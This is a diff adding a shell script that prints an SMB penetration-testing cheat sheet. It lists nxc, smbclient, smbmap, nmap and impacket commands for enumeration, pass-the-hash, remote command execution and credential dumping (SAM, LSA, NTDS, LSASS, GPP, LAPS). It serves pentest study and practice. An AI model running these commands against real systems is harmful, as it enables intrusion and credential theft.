@@ -1,0 +1,81 @@
+#!/bin/bash
+BOLD='\033[1m'
+CYAN='\033[36m'
+GREEN='\033[32m'
+YELLOW='\033[33m'
+BLUE='\033[34m'
+NC='\033[0m'
+
+printf "\n"
+echo -e "${BOLD}${YELLOW}── SMB — ENUMERATION & EXPLOITATION ─────────────────${NC}"
+printf "\n"
+
+echo -e "${BOLD}${CYAN}── nxc SMB Enum (Primary) ───────────────────────────${NC}"
+echo -e "  ${GREEN}nxc smb <TARGET> -u '' -p '' --users --groups --shares --pass-pol${NC}  # null session"
+echo -e "  ${GREEN}nxc smb <TARGET> -u guest -p '' --users --groups --shares --pass-pol${NC}  # guest"
+echo -e "  ${GREEN}nxc smb <TARGET> -u <USER> -p <PASS> --users --groups --shares --pass-pol${NC}  # creds"
+echo -e "  ${GREEN}nxc smb <TARGET> -u '' -p '' --rid-brute${NC}          # RID brute (user enum)"
+echo -e "  ${GREEN}nxc smb 192.168.1.0/24${NC}                            # host discovery + SMB info"
+printf "\n"
+
+echo -e "${BOLD}${CYAN}── nxc SMB Auth Methods ─────────────────────────────${NC}"
+echo -e "  ${GREEN}nxc smb <TARGET> -u <USER> -p <PASS>${NC}"
+echo -e "  ${GREEN}nxc smb <TARGET> -u <USER> -H <NTLM-HASH>${NC}         # Pass-the-Hash"
+echo -e "  ${GREEN}nxc smb <TARGET> -u <USER> -H <NTLM-HASH> --local-auth${NC}  # PTH local auth"
+echo -e "  ${GREEN}nxc smb <TARGET> -u <USER> -p <PASS> --local-auth${NC}  # local auth (skip domain)"
+echo -e "  ${GREEN}export KRB5CCNAME=/path/to/ticket.ccache && nxc smb <TARGET> -u <USER> -p <PASS> --use-kcache${NC}"
+printf "\n"
+
+echo -e "${BOLD}${CYAN}── nxc Command Execution ────────────────────────────${NC}"
+echo -e "  ${GREEN}nxc smb <TARGET> -u <USER> -p <PASS> -x 'whoami'${NC}  # CMD"
+echo -e "  ${GREEN}nxc smb <TARGET> -u <USER> -p <PASS> -X 'Get-Process'${NC}  # PowerShell"
+echo -e "  ${GREEN}nxc smb <TARGET> -u <USER> -p <PASS> -x 'cmd' --exec-method wmiexec${NC}"
+echo -e "  ${GREEN}nxc smb <TARGET> -u <USER> -p <PASS> -x 'cmd' --exec-method smbexec${NC}"
+printf "\n"
+
+echo -e "${BOLD}${CYAN}── nxc Credential Dumping ───────────────────────────${NC}"
+echo -e "  ${GREEN}nxc smb <TARGET> -u <USER> -p <PASS> --sam${NC}        # SAM (local hashes)"
+echo -e "  ${GREEN}nxc smb <TARGET> -u <USER> -p <PASS> --lsa${NC}        # LSA secrets"
+echo -e "  ${GREEN}nxc smb <DC_IP> -u <USER> -p <PASS> --ntds${NC}        # NTDS (DC only)"
+echo -e "  ${GREEN}nxc smb <TARGET> -u <USER> -p <PASS> -M lsassy${NC}    # LSASS dump"
+printf "\n"
+
+echo -e "${BOLD}${CYAN}── nxc Modules ──────────────────────────────────────${NC}"
+echo -e "  ${GREEN}nxc smb <TARGET> -u <USER> -p <PASS> -M laps${NC}      # LAPS password"
+echo -e "  ${GREEN}nxc smb <TARGET> -u <USER> -p <PASS> -M gpp_password${NC}  # GPP passwords"
+echo -e "  ${GREEN}nxc smb <TARGET> -u <USER> -p <PASS> -M gpp_autologin${NC} # GPP autologin"
+echo -e "  ${GREEN}nxc smb <TARGET> -u <USER> -p <PASS> -M ms17-010${NC}   # EternalBlue check"
+echo -e "  ${GREEN}nxc smb <TARGET> -u <USER> -p <PASS> -M zerologon${NC}  # Zerologon check"
+echo -e "  ${GREEN}nxc smb <TARGET> -u <USER> -p <PASS> -M enum_av${NC}    # AV detection"
+echo -e "  ${GREEN}nxc smb 192.168.1.0/24 --gen-relay-list relay_targets.txt${NC}  # relay target gen"
+echo -e "  ${GREEN}nxc smb <TARGET> -u <USER> -p <PASS> -M spider_plus${NC} # spider all shares"
+echo -e "  ${GREEN}nxc smb <TARGET> -u <USER> -p <PASS> -M psh_history${NC} # PS history creds"
+printf "\n"
+
+echo -e "${BOLD}${CYAN}── smbclient ────────────────────────────────────────${NC}"
+echo -e "  ${GREEN}smbclient -L //<TARGET>${NC}                            # list shares anon"
+echo -e "  ${GREEN}smbclient //<TARGET>/<SHARE>${NC}"
+echo -e "  ${GREEN}smbclient //<TARGET>/<SHARE> -U <USER>${NC}"
+echo -e "  ${GREEN}smbclient //<TARGET>/<SHARE> -U <USER> -N${NC}         # no password"
+echo -e "  Note: Inside smbclient: recurse on / prompt off / mget *"
+printf "\n"
+
+echo -e "${BOLD}${CYAN}── smbmap ───────────────────────────────────────────${NC}"
+echo -e "  ${GREEN}smbmap -H <TARGET>${NC}"
+echo -e "  ${GREEN}smbmap -H <TARGET> -d <DOMAIN> -u <USER> -p <PASS>${NC}"
+echo -e "  ${GREEN}python smbmap.py -H <TARGET> -u <USER> -p '<PASS>' -r 'C\$\\Users'${NC}"
+printf "\n"
+
+echo -e "${BOLD}${CYAN}── Nmap SMB ─────────────────────────────────────────${NC}"
+echo -e "  ${GREEN}nmap -v -p 139,445 --script smb* <TARGET>${NC}"
+echo -e "  ${GREEN}nmap --script smb-enum-shares -p139,445 -T4 -Pn <TARGET>${NC}"
+echo -e "  ${GREEN}sudo nbtscan -r 192.168.1.0/24${NC}                    # NetBIOS scan"
+printf "\n"
+
+echo -e "${BOLD}${CYAN}── PTH via SMB (impacket) ───────────────────────────${NC}"
+echo -e "  ${GREEN}impacket-psexec -hashes :<NTLM-HASH> Administrator@<TARGET>${NC}"
+echo -e "  ${GREEN}impacket-smbexec -hashes :<NTLM-HASH> Administrator@<TARGET>${NC}"
+printf "\n"
+
+printf "\n"
+echo -e "${YELLOW}─────────────────────────────────────────────────────${NC}"
